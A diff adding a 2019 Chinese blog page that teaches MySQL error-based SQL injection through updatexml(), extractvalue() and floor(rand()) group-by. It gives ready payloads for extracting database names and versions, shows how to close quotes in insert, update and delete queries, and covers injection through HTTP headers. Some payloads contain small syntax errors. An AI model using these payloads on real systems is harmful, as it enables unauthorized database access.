@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="常用报错函数1234567基于updatexml():函数是MySql对XML文档数据进行查询和修改的XPATH函数语法： UPDATEXML(xml_document,XPathstring,new_value)第一个参数：fiedname是String格式，为表中的字段名。第二个参数：XPathstring（Xpath格式的字符串）。第三个参数：new_value，String格式，替换查找到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql-Inject基于函数报错注入">
+<meta property="og:url" content="http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/index.html">
+<meta property="og:site_name" content="D-yu">
+<meta property="og:description" content="常用报错函数1234567基于updatexml():函数是MySql对XML文档数据进行查询和修改的XPATH函数语法： UPDATEXML(xml_document,XPathstring,new_value)第一个参数：fiedname是String格式，为表中的字段名。第二个参数：XPathstring（Xpath格式的字符串）。第三个参数：new_value，String格式，替换查找到">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-29T00:48:42.721Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sql-Inject基于函数报错注入">
+<meta name="twitter:description" content="常用报错函数1234567基于updatexml():函数是MySql对XML文档数据进行查询和修改的XPATH函数语法： UPDATEXML(xml_document,XPathstring,new_value)第一个参数：fiedname是String格式，为表中的字段名。第二个参数：XPathstring（Xpath格式的字符串）。第三个参数：new_value，String格式，替换查找到">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Sql-Inject基于函数报错注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/08/29/SQL报错注入/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/08/29/SQL注入原理介绍/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&text=Sql-Inject基于函数报错注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&is_video=false&description=Sql-Inject基于函数报错注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sql-Inject基于函数报错注入&body=Check out this article: http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&name=Sql-Inject基于函数报错注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用报错函数"><span class="toc-number">1.</span> <span class="toc-text">常用报错函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例"><span class="toc-number">2.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查出字段名超出一行则会报错显示，在后面添加-limit-0-1-来查询第一行内容"><span class="toc-number">3.</span> <span class="toc-text">查出字段名超出一行则会报错显示，在后面添加 limit 0,1   来查询第一行内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xpath定位必须是有效的，否则会发生错误"><span class="toc-number">4.</span> <span class="toc-text">Xpath定位必须是有效的，否则会发生错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于函数报错的信息的类型获取"><span class="toc-number">5.</span> <span class="toc-text">基于函数报错的信息的类型获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于extractvalue-函数是MySql对于XML文档数据进行查询的XPATH函数"><span class="toc-number">6.</span> <span class="toc-text">基于extractvalue():函数是MySql对于XML文档数据进行查询的XPATH函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于floor-MySql中用来取整的函数"><span class="toc-number">7.</span> <span class="toc-text">基于floor():MySql中用来取整的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Header注入"><span class="toc-number">8.</span> <span class="toc-text">HTTP Header注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">9.</span> <span class="toc-text">例子</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Sql-Inject基于函数报错注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">D-yu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-08-29T00:48:48.576Z" itemprop="datePublished">2019-08-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="常用报错函数"><a href="#常用报错函数" class="headerlink" title="常用报错函数"></a>常用报错函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基于updatexml():函数是MySql对XML文档数据进行查询和修改的XPATH函数</span><br><span class="line">语法： UPDATEXML(xml_document,XPathstring,new_value)</span><br><span class="line">第一个参数：fiedname是String格式，为表中的字段名。</span><br><span class="line">第二个参数：XPathstring（Xpath格式的字符串）。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的</span><br><span class="line">拼接  and updatexml(1,concat(0x7e,version()),0)   version为要查询的内容</span><br><span class="line">查询数据库  and updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure>
+
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>也可以在里面添加sql语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(select 查询内容 from information_schema,tables <span class="built_in">where</span> table_schema=<span class="string">'表名'</span>))，0)</span><br></pre></td></tr></table></figure>
+
+<h3 id="查出字段名超出一行则会报错显示，在后面添加-limit-0-1-来查询第一行内容"><a href="#查出字段名超出一行则会报错显示，在后面添加-limit-0-1-来查询第一行内容" class="headerlink" title="查出字段名超出一行则会报错显示，在后面添加 limit 0,1   来查询第一行内容"></a>查出字段名超出一行则会报错显示，在后面添加 limit 0,1   来查询第一行内容</h3><p>limit 0,1 （第一个数字是从第几行开始显示，第二个数字是显示几行）</p>
+<h3 id="Xpath定位必须是有效的，否则会发生错误"><a href="#Xpath定位必须是有效的，否则会发生错误" class="headerlink" title="Xpath定位必须是有效的，否则会发生错误"></a>Xpath定位必须是有效的，否则会发生错误</h3><h3 id="基于函数报错的信息的类型获取"><a href="#基于函数报错的信息的类型获取" class="headerlink" title="基于函数报错的信息的类型获取"></a>基于函数报错的信息的类型获取</h3><p>(select/insert/update/delete)(查询/添加/更新/删除)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insert和update </span><br><span class="line">构造or闭合</span><br><span class="line">拼接 or updatexml (1,concat(0x7e,database()),0) or <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">如果是数字型的话，不需要单引号闭合，</span></span><br><span class="line"><span class="string">or updatexml (1,concat(0x7e,database()),0)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基于extractvalue-函数是MySql对于XML文档数据进行查询的XPATH函数"><a href="#基于extractvalue-函数是MySql对于XML文档数据进行查询的XPATH函数" class="headerlink" title="基于extractvalue():函数是MySql对于XML文档数据进行查询的XPATH函数"></a>基于extractvalue():函数是MySql对于XML文档数据进行查询的XPATH函数</h3><p>extractvalue() :对XML文档进行查询的函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法：EXtractValue(xml_document,xpath_string)     extractvalue(目标xml文档，xml路径)</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string(Xpath格式的字符串)</span><br><span class="line">Xpath定位必须是有效的，否则会发生错误</span><br><span class="line">实例</span><br><span class="line">拼接 and extractvalue(0,concat(0x7e,version()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基于floor-MySql中用来取整的函数"><a href="#基于floor-MySql中用来取整的函数" class="headerlink" title="基于floor():MySql中用来取整的函数"></a>基于floor():MySql中用来取整的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor想要报错必须具备的条件：在他的表达式里面必须要有concat还得有group by和rand</span><br><span class="line">拼接 and (select 2 from (select count(*),concat(,floor(rand(0)*2))x from information_schema.tables group by x)a)<span class="comment">#</span></span><br><span class="line">concat可以进行添加SQL语句</span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP-Header注入"><a href="#HTTP-Header注入" class="headerlink" title="HTTP Header注入"></a>HTTP Header注入</h3><p>开发人员为了验证客户端头信息(比如常用的cookie验证)或通过http header头信息获取客户端的一些信息，比如useragent、accept字段等。</p>
+<p>会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能导致基于http header的SQL Inject漏洞。</p>
+<p>可使用MySQL语句拼接，进行获取相关信息</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>首先用burp抓包，修改包内判断前端获取的信息，提交看看是否有mysql报错，<br>如果有，则在抓到的包内进行sql语句的拼接，来获取信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml (1,concat(0x7e,database()),0) or <span class="string">'</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用报错函数"><span class="toc-number">1.</span> <span class="toc-text">常用报错函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例"><span class="toc-number">2.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查出字段名超出一行则会报错显示，在后面添加-limit-0-1-来查询第一行内容"><span class="toc-number">3.</span> <span class="toc-text">查出字段名超出一行则会报错显示，在后面添加 limit 0,1   来查询第一行内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xpath定位必须是有效的，否则会发生错误"><span class="toc-number">4.</span> <span class="toc-text">Xpath定位必须是有效的，否则会发生错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于函数报错的信息的类型获取"><span class="toc-number">5.</span> <span class="toc-text">基于函数报错的信息的类型获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于extractvalue-函数是MySql对于XML文档数据进行查询的XPATH函数"><span class="toc-number">6.</span> <span class="toc-text">基于extractvalue():函数是MySql对于XML文档数据进行查询的XPATH函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于floor-MySql中用来取整的函数"><span class="toc-number">7.</span> <span class="toc-text">基于floor():MySql中用来取整的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Header注入"><span class="toc-number">8.</span> <span class="toc-text">HTTP Header注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">9.</span> <span class="toc-text">例子</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&text=Sql-Inject基于函数报错注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&is_video=false&description=Sql-Inject基于函数报错注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sql-Inject基于函数报错注入&body=Check out this article: http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&title=Sql-Inject基于函数报错注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/29/Sql-Inject基于函数报错注入/&name=Sql-Inject基于函数报错注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
